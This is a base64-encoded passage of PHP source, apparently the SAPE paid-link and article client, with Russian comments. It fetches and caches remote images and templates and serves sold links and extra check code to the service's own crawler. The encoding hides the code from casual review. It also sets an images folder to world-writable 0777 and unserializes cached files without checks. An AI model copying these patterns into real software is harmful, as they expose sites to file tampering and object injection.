FUiAuICcmaG9zdD0nIC4gJHRoaXMtPl9ob3N0OwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfc2V0X2RhdGEoJGRhdGEpCiAgICB7CiAgICAgICAgJHRoaXMtPl93b3JkcyA9ICRkYXRhOwogICAgICAgIGlmIChAYXJyYXlfa2V5X2V4aXN0cygkdGhpcy0+X3JlcXVlc3RfdXJpLCAkdGhpcy0+X3dvcmRzKSAmJiBpc19hcnJheSgkdGhpcy0+X3dvcmRzWyR0aGlzLT5fcmVxdWVzdF91cmldKSkgewogICAgICAgICAgICAkdGhpcy0+X3dvcmRzX3BhZ2UgPSAkdGhpcy0+X3dvcmRzWyR0aGlzLT5fcmVxdWVzdF91cmldOwogICAgICAgIH0KCiAgICAgICAgLy/QldGB0YLRjCDQu9C4INC+0LHRj9C30LDRgtC10LvRjNC90YvQuSDQstGL0LLQvtC0CiAgICAgICAgaWYgKGlzc2V0KCR0aGlzLT5fd29yZHNbJ19fc2FwZV9wYWdlX29ibGlnYXRvcnlfb3V0cHV0X18nXSkpIHsKICAgICAgICAgICAgJHRoaXMtPl9wYWdlX29ibGlnYXRvcnlfb3V0cHV0ID0gJHRoaXMtPl93b3Jkc1snX19zYXBlX3BhZ2Vfb2JsaWdhdG9yeV9vdXRwdXRfXyddOwogICAgICAgIH0KICAgIH0KfQoKLyoqCiAqINCa0LvQsNGB0YEg0LTQu9GPINGA0LDQsdC+0YLRiyDRgdC+INGB0YLQsNGC0YzRj9C80LggYXJ0aWNsZXMuc2FwZS5ydSDQv9C+0LrQsNC30YvQstCw0LXRgiDQsNC90L7QvdGB0Ysg0Lgg0YHRgtCw0YLRjNC4CiAqLwpjbGFzcyBTQVBFX2FydGljbGVzIGV4dGVuZHMgU0FQRV9iYXNlCnsKICAgIHByb3RlY3RlZCAkX3JlcXVlc3RfbW9kZTsKCiAgICBwcm90ZWN0ZWQgJF9zZXJ2ZXJfbGlzdCA9IGFycmF5KCdkaXNwZW5zZXIuYXJ0aWNsZXMuc2FwZS5ydScpOwoKICAgIHByb3RlY3RlZCAkX2RhdGEgPSBhcnJheSgpOwoKICAgIHByb3RlY3RlZCAkX2FydGljbGVfaWQ7CgogICAgcHJvdGVjdGVkICRfc2F2ZV9maWxlX25hbWU7CgogICAgcHJvdGVjdGVkICRfYW5ub3VuY2VtZW50c19kZWxpbWl0ZXIgPSAnJzsKCiAgICBwcm90ZWN0ZWQgJF9pbWFnZXNfcGF0aDsKCiAgICBwcm90ZWN0ZWQgJF90ZW1wbGF0ZV9lcnJvciA9IGZhbHNlOwoKICAgIHByb3RlY3RlZCAkX25vaW5kZXhfY29kZSA9ICc8IS0tc2FwZV9ub2luZGV4LS0+JzsKCiAgICBwcm90ZWN0ZWQgJF9oZWFkZXJzX2VuYWJsZWQgPSBmYWxzZTsKCiAgICBwcm90ZWN0ZWQgJF9tYXNrX2NvZGU7CgogICAgcHJvdGVjdGVkICRfcmVhbF9ob3N0OwoKICAgIHByb3RlY3RlZCAkX3VzZXJfYWdlbnQgPSAnU0FQRV9BcnRpY2xlc19DbGllbnQgUEhQJzsKCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJG9wdGlvbnMgPSBudWxsKQogICAgewogICAgICAgIHBhcmVudDo6X19jb25zdHJ1Y3QoJG9wdGlvbnMpOwogICAgICAgIGlmIChpc19hcnJheSgkb3B0aW9ucykgJiYgaXNzZXQoJG9wdGlvbnNbJ2hlYWRlcnNfZW5hYmxlZCddKSkgewogICAgICAgICAgICAkdGhpcy0+X2hlYWRlcnNfZW5hYmxlZCA9ICRvcHRpb25zWydoZWFkZXJzX2VuYWJsZWQnXTsKICAgICAgICB9CiAgICAgICAgLy8g0JrQvtC00LjRgNC+0LLQutCwCiAgICAgICAgaWYgKGlzc2V0KCRvcHRpb25zWydjaGFyc2V0J10pICYmIHN0cmxlbigkb3B0aW9uc1snY2hhcnNldCddKSkgewogICAgICAgICAgICAkdGhpcy0+X2NoYXJzZXQgPSAkb3B0aW9uc1snY2hhcnNldCddOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5fY2hhcnNldCA9ICcnOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+X2dldF9pbmRleCgpOwogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPl9kYXRhWydpbmRleCddWydhbm5vdW5jZW1lbnRzX2RlbGltaXRlciddKSkgewogICAgICAgICAgICAkdGhpcy0+X2Fubm91bmNlbWVudHNfZGVsaW1pdGVyID0gJHRoaXMtPl9kYXRhWydpbmRleCddWydhbm5vdW5jZW1lbnRzX2RlbGltaXRlciddOwogICAgICAgIH0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5fZGF0YVsnaW5kZXgnXVsnY2hhcnNldCddKQogICAgICAgICAgICBhbmQgIShpc3NldCgkb3B0aW9uc1snY2hhcnNldCddKSAmJiBzdHJsZW4oJG9wdGlvbnNbJ2NoYXJzZXQnXSkpCiAgICAgICAgKSB7CiAgICAgICAgICAgICR0aGlzLT5fY2hhcnNldCA9ICR0aGlzLT5fZGF0YVsnaW5kZXgnXVsnY2hhcnNldCddOwogICAgICAgIH0KICAgICAgICBpZiAoaXNfYXJyYXkoJG9wdGlvbnMpKSB7CiAgICAgICAgICAgIGlmIChpc3NldCgkb3B0aW9uc1snaG9zdCddKSkgewogICAgICAgICAgICAgICAgJGhvc3QgPSAkb3B0aW9uc1snaG9zdCddOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlaWYgKHN0cmxlbigkb3B0aW9ucykpIHsKICAgICAgICAgICAgJGhvc3QgICAgPSAkb3B0aW9uczsKICAgICAgICAgICAgJG9wdGlvbnMgPSBhcnJheSgpOwogICAgICAgIH0KICAgICAgICBpZiAoaXNzZXQoJGhvc3QpICYmIHN0cmxlbigkaG9zdCkpIHsKICAgICAgICAgICAgJHRoaXMtPl9yZWFsX2hvc3QgPSAkaG9zdDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+X3JlYWxfaG9zdCA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKICAgICAgICB9CiAgICAgICAgaWYgKCFpc3NldCgkdGhpcy0+X2RhdGFbJ2luZGV4J11bJ2Fubm91bmNlbWVudHMnXVskdGhpcy0+X3JlcXVlc3RfdXJpXSkpIHsKICAgICAgICAgICAgJHRoaXMtPl9jb3JyZWN0X3VyaSgpOwogICAgICAgIH0KICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX2NvcnJlY3RfdXJpKCkKICAgIHsKICAgICAgICBpZiAoc3Vic3RyKCR0aGlzLT5fcmVxdWVzdF91cmksIC0xKSA9PSAnLycpIHsKICAgICAgICAgICAgJG5ld191cmkgPSBzdWJzdHIoJHRoaXMtPl9yZXF1ZXN0X3VyaSwgMCwgLTEpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRuZXdfdXJpID0gJHRoaXMtPl9yZXF1ZXN0X3VyaSAuICcvJzsKICAgICAgICB9CiAgICAgICAgaWYgKGlzc2V0KCR0aGlzLT5fZGF0YVsnaW5kZXgnXVsnYW5ub3VuY2VtZW50cyddWyRuZXdfdXJpXSkpIHsKICAgICAgICAgICAgJHRoaXMtPl9yZXF1ZXN0X3VyaSA9ICRuZXdfdXJpOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqINCS0L7Qt9Cy0YDQsNGJ0LDQtdGCINCw0L3QvtC90YHRiyDQtNC70Y8g0LLRi9Cy0L7QtNCwCiAgICAgKgogICAgICogQHBhcmFtIGludCAkbiAgICAgINCh0LrQvtC70YzQutC+INCw0L3QvtC90YHQvtCyINCy0YvQstC10YHRgtC4LCDQu9C40LHQviDQvdC1INC30LDQtNCw0L3QviAtINCy0YvQstC10YHRgtC4INCy0YHQtQogICAgICogQHBhcmFtIGludCAkb2Zmc2V0IEMg0LrQsNC60L7Qs9C+INCw0L3QvtC90YHQsCDQvdCw0YfQuNC90LDQtdC8INCy0YvQstC+0LQo0L3Rg9C80LXRgNCw0YbQuNGPINGBIDApLCDQu9C40LHQviDQvdC1INC30LDQtNCw0L3QviAtINGBINC90YPQu9C10LLQvtCz0L4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcmV0dXJuX2Fubm91bmNlbWVudHMoJG4gPSBudWxsLCAkb2Zmc2V0ID0gMCkKICAgIHsKICAgICAgICAkb3V0cHV0ID0gJyc7CiAgICAgICAgaWYgKCR0aGlzLT5fZm9yY2Vfc2hvd19jb2RlIHx8ICR0aGlzLT5faXNfb3VyX2JvdCkgewogICAgICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPl9kYXRhWydpbmRleCddWydjaGVja0NvZGUnXSkpIHsKICAgICAgICAgICAgICAgICRvdXRwdXQgLj0gJHRoaXMtPl9kYXRhWydpbmRleCddWydjaGVja0NvZGUnXTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKGZhbHNlID09ICR0aGlzLT5fc2hvd19jb3VudGVyX3NlcGFyYXRlbHkpIHsKICAgICAgICAgICAgJG91dHB1dCAuPSAkdGhpcy0+X3JldHVybl9vYmxpZ2F0b3J5X3BhZ2VfY29udGVudCgpOwogICAgICAgIH0KCiAgICAgICAgaWYgKGlzc2V0KCR0aGlzLT5fZGF0YVsnaW5kZXgnXVsnYW5ub3VuY2VtZW50cyddWyR0aGlzLT5fcmVxdWVzdF91cmldKSkgewoKICAgICAgICAgICAgJHRvdGFsX3BhZ2VfbGlua3MgPSBjb3VudCgkdGhpcy0+X2RhdGFbJ2luZGV4J11bJ2Fubm91bmNlbWVudHMnXVskdGhpcy0+X3JlcXVlc3RfdXJpXSk7CgogICAgICAgICAgICBpZiAoIWlzX251bWVyaWMoJG4pIHx8ICRuID4gJHRvdGFsX3BhZ2VfbGlua3MpIHsKICAgICAgICAgICAgICAgICRuID0gJHRvdGFsX3BhZ2VfbGlua3M7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRsaW5rcyA9IGFycmF5KCk7CgogICAgICAgICAgICBmb3IgKCRpID0gMTsgJGkgPD0gJG47ICRpKyspIHsKICAgICAgICAgICAgICAgIGlmICgkb2Zmc2V0ID4gMCAmJiAkaSA8PSAkb2Zmc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgYXJyYXlfc2hpZnQoJHRoaXMtPl9kYXRhWydpbmRleCddWydhbm5vdW5jZW1lbnRzJ11bJHRoaXMtPl9yZXF1ZXN0X3VyaV0pOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkbGlua3NbXSA9IGFycmF5X3NoaWZ0KCR0aGlzLT5fZGF0YVsnaW5kZXgnXVsnYW5ub3VuY2VtZW50cyddWyR0aGlzLT5fcmVxdWVzdF91cmldKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGh0bWwgPSBqb2luKCR0aGlzLT5fYW5ub3VuY2VtZW50c19kZWxpbWl0ZXIsICRsaW5rcyk7CgogICAgICAgICAgICBpZiAoJHRoaXMtPl9pc19vdXJfYm90KSB7CiAgICAgICAgICAgICAgICAkaHRtbCA9ICc8c2FwZV9ub2luZGV4PicgLiAkaHRtbCAuICc8L3NhcGVfbm9pbmRleD4nOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkb3V0cHV0IC49ICRodG1sOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRvdXRwdXQ7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9nZXRfaW5kZXgoKQogICAgewogICAgICAgICR0aGlzLT5fc2V0X3JlcXVlc3RfbW9kZSgnaW5kZXgnKTsKICAgICAgICAkdGhpcy0+X3NhdmVfZmlsZV9uYW1lID0gJ2FydGljbGVzLmRiJzsKICAgICAgICAkdGhpcy0+X2xvYWRfZGF0YSgpOwogICAgfQoKICAgIC8qKgogICAgICog0JLQvtC30LLRgNCw0YnQsNC10YIg0L/QvtC70L3Ri9C5IEhUTUwg0LrQvtC0INGB0YLRgNCw0L3QuNGG0Ysg0YHRgtCw0YLRjNC4CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcHJvY2Vzc19yZXF1ZXN0KCkKICAgIHsKCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+X2RhdGFbJ2luZGV4J10pIGFuZCBpc3NldCgkdGhpcy0+X2RhdGFbJ2luZGV4J11bJ2FydGljbGVzJ11bJHRoaXMtPl9yZXF1ZXN0X3VyaV0pKSB7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+X3JldHVybl9hcnRpY2xlKCk7CiAgICAgICAgfSBlbHNlaWYgKCFlbXB0eSgkdGhpcy0+X2RhdGFbJ2luZGV4J10pIGFuZCBpc3NldCgkdGhpcy0+X2RhdGFbJ2luZGV4J11bJ2ltYWdlcyddWyR0aGlzLT5fcmVxdWVzdF91cmldKSkgewogICAgICAgICAgICByZXR1cm4gJHRoaXMtPl9yZXR1cm5faW1hZ2UoKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoJHRoaXMtPl9pc19vdXJfYm90KSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPl9yZXR1cm5faHRtbCgkdGhpcy0+X2RhdGFbJ2luZGV4J11bJ2NoZWNrQ29kZSddIC4gJHRoaXMtPl9ub2luZGV4X2NvZGUpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5fcmV0dXJuX25vdF9mb3VuZCgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfcmV0dXJuX2FydGljbGUoKQogICAgewogICAgICAgICR0aGlzLT5fc2V0X3JlcXVlc3RfbW9kZSgnYXJ0aWNsZScpOwogICAgICAgIC8v0JfQsNCz0YDRg9C20LDQtdC8INGB0YLQsNGC0YzRjgogICAgICAgICRhcnRpY2xlX21ldGEgICAgICAgICAgPSAkdGhpcy0+X2RhdGFbJ2luZGV4J11bJ2FydGljbGVzJ11bJHRoaXMtPl9yZXF1ZXN0X3VyaV07CiAgICAgICAgJHRoaXMtPl9zYXZlX2ZpbGVfbmFtZSA9ICRhcnRpY2xlX21ldGFbJ2lkJ10gLiAnLmFydGljbGUuZGInOwogICAgICAgICR0aGlzLT5fYXJ0aWNsZV9pZCAgICAgPSAkYXJ0aWNsZV9tZXRhWydpZCddOwogICAgICAgICR0aGlzLT5fbG9hZF9kYXRhKCk7CiAgICAgICAgaWYgKGZhbHNlID09ICR0aGlzLT5fc2hvd19jb3VudGVyX3NlcGFyYXRlbHkpIHsKICAgICAgICAgICAgJHRoaXMtPl9kYXRhWyR0aGlzLT5fcmVxdWVzdF9tb2RlXVsnYm9keSddID0gJHRoaXMtPl9yZXR1cm5fb2JsaWdhdG9yeV9wYWdlX2NvbnRlbnQoKSAuICR0aGlzLT5fZGF0YVskdGhpcy0+X3JlcXVlc3RfbW9kZV1bJ2JvZHknXTsKICAgICAgICB9CgogICAgICAgIC8v0J7QsdC90L7QstC40Lwg0LXRgdC70Lgg0YPRgdGC0LDRgNC10LvQsAogICAgICAgIGlmICghaXNzZXQoJHRoaXMtPl9kYXRhWydhcnRpY2xlJ11bJ2RhdGVfdXBkYXRlZCddKSBPUiAkdGhpcy0+X2RhdGFbJ2FydGljbGUnXVsnZGF0ZV91cGRhdGVkJ10gPCAkYXJ0aWNsZV9tZXRhWydkYXRlX3VwZGF0ZWQnXSkgewogICAgICAgICAgICB1bmxpbmsoJHRoaXMtPl9nZXRfZGJfZmlsZSgpKTsKICAgICAgICAgICAgJHRoaXMtPl9sb2FkX2RhdGEoKTsKICAgICAgICB9CgogICAgICAgIC8v0J/QvtC70YPRh9C40Lwg0YjQsNCx0LvQvtC9CiAgICAgICAgJHRlbXBsYXRlID0gJHRoaXMtPl9nZXRfdGVtcGxhdGUoJHRoaXMtPl9kYXRhWydpbmRleCddWyd0ZW1wbGF0ZXMnXVskYXJ0aWNsZV9tZXRhWyd0ZW1wbGF0ZV9pZCddXVsndXJsJ10sICRhcnRpY2xlX21ldGFbJ3RlbXBsYXRlX2lkJ10pOwoKICAgICAgICAvL9CS0YvQstC10LTQtdC8INGB0YLQsNGC0YzRjgogICAgICAgICRhcnRpY2xlX2h0bWwgPSAkdGhpcy0+X2ZldGNoX2FydGljbGUoJHRlbXBsYXRlKTsKCiAgICAgICAgaWYgKCR0aGlzLT5faXNfb3VyX2JvdCkgewogICAgICAgICAgICAkYXJ0aWNsZV9odG1sIC49ICR0aGlzLT5fbm9pbmRleF9jb2RlOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0aGlzLT5fcmV0dXJuX2h0bWwoJGFydGljbGVfaHRtbCk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9wcmVwYXJlX3BhdGhfdG9faW1hZ2VzKCkKICAgIHsKICAgICAgICAkdGhpcy0+X2ltYWdlc19wYXRoID0gZGlybmFtZShfX0ZJTEVfXykgLiAnL2ltYWdlcy8nOwogICAgICAgIGlmICghaXNfZGlyKCR0aGlzLT5faW1hZ2VzX3BhdGgpKSB7CiAgICAgICAgICAgIC8vINCf0YvRgtCw0LXQvNGB0Y8g0YHQvtC30LTQsNGC0Ywg0L/QsNC/0LrRgy4KICAgICAgICAgICAgaWYgKEBta2RpcigkdGhpcy0+X2ltYWdlc19wYXRoKSkgewogICAgICAgICAgICAgICAgQGNobW9kKCR0aGlzLT5faW1hZ2VzX3BhdGgsIDA3NzcpOyAgICAvLyDQn9GA0LDQstCwINC00L7RgdGC0YPQv9CwCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPl9yYWlzZV9lcnJvcign0J3QtdGCINC/0LDQv9C60LggJyAuICR0aGlzLT5faW1hZ2VzX3BhdGggLiAnLiDQodC+0LfQtNCw0YLRjCDQvdC1INGD0LTQsNC70L7RgdGMLiDQktGL0YHRgtCw0LLQuNGC0LUg0L/RgNCw0LLQsCA3Nzcg0L3QsCDQv9Cw0L/QutGDLicpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+X211bHRpX3NpdGUpIHsKICAgICAgICAgICAgJHRoaXMtPl9pbWFnZXNfcGF0aCAuPSAkdGhpcy0+X2hvc3QgLiAnLic7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX3JldHVybl9pbWFnZSgpCiAgICB7CiAgICAgICAgJHRoaXMtPl9zZXRfcmVxdWVzdF9tb2RlKCdpbWFnZScpOwogICAgICAgICR0aGlzLT5fcHJlcGFyZV9wYXRoX3RvX2ltYWdlcygpOwoKICAgICAgICAvL9Cf0YDQvtCy0LXRgNC40Lwg0LfQsNCz0YDRg9C20LXQvdCwINC70Lgg0LrQsNGA0YLQuNC90LrQsAogICAgICAgICRpbWFnZV9tZXRhID0gJHRoaXMtPl9kYXRhWydpbmRleCddWydpbWFnZXMnXVskdGhpcy0+X3JlcXVlc3RfdXJpXTsKICAgICAgICAkaW1hZ2VfcGF0aCA9ICR0aGlzLT5faW1hZ2VzX3BhdGggLiAkaW1hZ2VfbWV0YVsnaWQnXSAuICcuJyAuICRpbWFnZV9tZXRhWydleHQnXTsKCiAgICAgICAgaWYgKCFpc19maWxlKCRpbWFnZV9wYXRoKSBvciBmaWxlbXRpbWUoJGltYWdlX3BhdGgpID4gJGltYWdlX21ldGFbJ2RhdGVfdXBkYXRlZCddKSB7CiAgICAgICAgICAgIC8vINCn0YLQvtCx0Ysg0L3QtSDQv9C+0LLQtdGB0LjRgtGMINC/0LvQvtGJ0LDQtNC60YMg0LrQu9C40LXQvdGC0LAg0Lgg0YfRgtC+0LHRiyDQvdC1INCx0YvQu9C+INC+0LTQvdC+0LLRgNC10LzQtdC90L3Ri9GFINC30LDQv9GA0L7RgdC+0LIKICAgICAgICAgICAgQHRvdWNoKCRpbWFnZV9wYXRoLCAkaW1hZ2VfbWV0YVsnZGF0ZV91cGRhdGVkJ10pOwoKICAgICAgICAgICAgJHBhdGggPSAkaW1hZ2VfbWV0YVsnZGlzcGVuc2VyX3BhdGgnXTsKCiAgICAgICAgICAgIGZvcmVhY2ggKCR0aGlzLT5fc2VydmVyX2xpc3QgYXMgJHNlcnZlcikgewogICAgICAgICAgICAgICAgaWYgKCRkYXRhID0gJHRoaXMtPl9mZXRjaF9yZW1vdGVfZmlsZSgkc2VydmVyLCAkcGF0aCkpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoc3Vic3RyKCRkYXRhLCAwLCAxMikgPT0gJ0ZBVEFMIEVSUk9SOicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9yYWlzZV9lcnJvcigkZGF0YSk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gW9C/0YHQtdCy0LTQvl3Qv9GA0L7QstC10YDQutCwINGG0LXQu9C+0YHRgtC90L7RgdGC0Lg6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGRhdGEpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl93cml0ZSgkaW1hZ2VfcGF0aCwgJGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHVuc2V0KCRkYXRhKTsKICAgICAgICBpZiAoIWlzX2ZpbGUoJGltYWdlX3BhdGgpKSB7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+X3JldHVybl9ub3RfZm91bmQoKTsKICAgICAgICB9CiAgICAgICAgJGltYWdlX2ZpbGVfbWV0YSA9IEBnZXRpbWFnZXNpemUoJGltYWdlX3BhdGgpOwogICAgICAgICRjb250ZW50X3R5cGUgICAgPSBpc3NldCgkaW1hZ2VfZmlsZV9tZXRhWydtaW1lJ10pID8gJGltYWdlX2ZpbGVfbWV0YVsnbWltZSddIDogJ2ltYWdlJzsKICAgICAgICBpZiAoJHRoaXMtPl9oZWFkZXJzX2VuYWJsZWQpIHsKICAgICAgICAgICAgaGVhZGVyKCdDb250ZW50LVR5cGU6ICcgLiAkY29udGVudF90eXBlKTsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkdGhpcy0+X3JlYWQoJGltYWdlX3BhdGgpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfZmV0Y2hfYXJ0aWNsZSgkdGVtcGxhdGUpCiAgICB7CiAgICAgICAgaWYgKHN0cmxlbigkdGhpcy0+X2NoYXJzZXQpKSB7CiAgICAgICAgICAgICR0ZW1wbGF0ZSA9IHN0cl9yZXBsYWNlKCd7bWV0YV9jaGFyc2V0fScsICR0aGlzLT5fY2hhcnNldCwgJHRlbXBsYXRlKTsKICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPl9kYXRhWydpbmRleCddWyd0ZW1wbGF0ZV9maWVsZHMnXSBhcyAkZmllbGQpIHsKICAgICAgICAgICAgaWYgKGlzc2V0KCR0aGlzLT5fZGF0YVsnYXJ0aWNsZSddWyRmaWVsZF0pKSB7CiAgICAgICAgICAgICAgICAkdGVtcGxhdGUgPSBzdHJfcmVwbGFjZSgneycgLiAkZmllbGQgLiAnfScsICR0aGlzLT5fZGF0YVsnYXJ0aWNsZSddWyRmaWVsZF0sICR0ZW1wbGF0ZSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkdGVtcGxhdGUgPSBzdHJfcmVwbGFjZSgneycgLiAkZmllbGQgLiAnfScsICcnLCAkdGVtcGxhdGUpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gKCR0ZW1wbGF0ZSk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9nZXRfdGVtcGxhdGUoJHRlbXBsYXRlX3VybCwgJHRlbXBsYXRlSWQpCiAgICB7CiAgICAgICAgLy/Ql9Cw0LPRgNGD0LfQuNC8INC40L3QtNC10LrRgSDQtdGB0LvQuCDQtdGB0YLRjAogICAgICAgICR0aGlzLT5fc2F2ZV9maWxlX25hbWUgPSAndHBsLmFydGljbGVzLmRiJzsKICAgICAgICAkaW5kZXhfZmlsZSAgICAgICAgICAgID0gJHRoaXMtPl9nZXRfZGJfZmlsZSgpOwoKICAgICAgICBpZiAoZmlsZV9leGlzdHMoJGluZGV4X2ZpbGUpKSB7CiAgICAgICAgICAgICR0aGlzLT5fZGF0YVsndGVtcGxhdGVzJ10gPSB1bnNlcmlhbGl6ZSgkdGhpcy0+X3JlYWQoJGluZGV4X2ZpbGUpKTsKICAgICAgICB9CgoKICAgICAgICAvL9CV0YHQu9C4INGI0LDQsdC70L7QvSDQvdC1INC90LDQudC00LXQvSDQuNC70Lgg0YPRgdGC0LDRgNC10Lsg0LIg0LjQvdC00LXQutGB0LUsINC+0LHQvdC+0LLQuNC8INC10LPQvgogICAgICAgIGlmICghaXNzZXQoJHRoaXMtPl9kYXRhWyd0ZW1wbGF0ZXMnXVskdGVtcGxhdGVfdXJsXSkKICAgICAgICAgICAgb3IgKHRpbWUoKSAtICR0aGlzLT5fZGF0YVsndGVtcGxhdGVzJ11bJHRlbXBsYXRlX3VybF1bJ2RhdGVfdXBkYXRlZCddKSA+ICR0aGlzLT5fZGF0YVsnaW5kZXgnXVsndGVtcGxhdGVzJ11bJHRlbXBsYXRlSWRdWydsaWZldGltZSddCiAgICAgICAgKSB7CiAgICAgICAgICAgICR0aGlzLT5fcmVmcmVzaF90ZW1wbGF0ZSgkdGVtcGxhdGVfdXJsLCAkaW5kZXhfZmlsZSk7CiAgICAgICAgfQogICAgICAgIC8v0JXRgdC70Lgg0YjQsNCx0LvQvtC9INC90LUg0L7QsdC90LDRgNGD0LbQtdC9IC0g0L7RiNC40LHQutCwCiAgICAgICAgaWYgKCFpc3NldCgkdGhpcy0+X2RhdGFbJ3RlbXBsYXRlcyddWyR0ZW1wbGF0ZV91cmxdKSkgewogICAgICAgICAgICBpZiAoJHRoaXMtPl90ZW1wbGF0ZV9lcnJvcikgewogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5fcmFpc2VfZXJyb3IoJHRoaXMtPl90ZW1wbGF0ZV9lcnJvcik7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+X3JhaXNlX2Vycm9yKCfQndC1INC90LDQudC00LXQvSDRiNCw0LHQu9C+0L0g0LTQu9GPINGB0YLQsNGC0YzQuCcpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICR0aGlzLT5fZGF0YVsndGVtcGxhdGVzJ11bJHRlbXBsYXRlX3VybF1bJ2JvZHknXTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX3JlZnJlc2hfdGVtcGxhdGUoJHRlbXBsYXRlX3VybCwgJGluZGV4X2ZpbGUpCiAgICB7CiAgICAgICAgJHBhcnNlVXJsID0gcGFyc2VfdXJsKCR0ZW1wbGF0ZV91cmwpOwoKICAgICAgICAkZG93bmxvYWRfdXJsID0gJyc7CiAgICAgICAgaWYgKCRwYXJzZVVybFsncGF0aCddKSB7CiAgICAgICAgICAgICRkb3dubG9hZF91cmwgLj0gJHBhcnNlVXJsWydwYXRoJ107CiAgICAgICAgfQogICAgICAgIGlmIChpc3NldCgkcGFyc2VVcmxbJ3F1ZXJ5J10pKSB7CiAgICAgICAgICAgICRkb3dubG9hZF91cmwgLj0gJz8nIC4gJHBhcnNlVXJsWydxdWVyeSddOwogICAgICAgIH0KCiAgICAgICAgJHRlbXBsYXRlX2JvZHkgPSAkdGhpcy0+X2ZldGNoX3JlbW90ZV9maWxlKCR0aGlzLT5fcmVhbF9ob3N0LCAkZG93bmxvYWRfdXJsLCB0cnVlKTsKCiAgICAgICAgLy/Qv9GA0L7QstC10YDQuNC8INC10LPQviDQvdCwINC60L7RgNGA0LXQutGC0L3QvtGB0YLRjAogICAgICAgIGlmICghJHRoaXMtPl9pc192YWxpZF90ZW1wbGF0ZSgkdGVtcGxhdGVfYm9keSkpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgJHRlbXBsYXRlX2JvZHkgPSAkdGhpcy0+X2N1dF90ZW1wbGF0ZV9saW5rcygkdGVtcGxhdGVfYm9keSk7CgogICAgICAgIC8v0JfQsNC/0LjRiNC10Lwg0LXQs9C+INCy0LzQtdGB0YLQtSDRgSDQtNGA0YPQs9C40LzQuCDQsiDQutGN0YgKICAgICAgICAkdGhpcy0+X2RhdGFbJ3RlbXBsYXRlcyddWyR0ZW1wbGF0ZV91cmxdID0gYXJyYXkoJ2JvZHknID0+ICR0ZW1wbGF0ZV9ib2R5LCAnZGF0ZV91cGRhdGVkJyA9PiB0aW1lKCkpOwogICAgICAgIC8v0Jgg0YHQvtGF0YDQsNC90LjQvCDQutGN0YgKICAgICAgICAkdGhpcy0+X3dyaXRlKCRpbmRleF9maWxlLCBzZXJpYWxpemUoJHRoaXMtPl9kYXRhWyd0ZW1wbGF0ZXMnXSkpOwoKICAgICAgICByZXR1cm4gdHJ1ZTsKI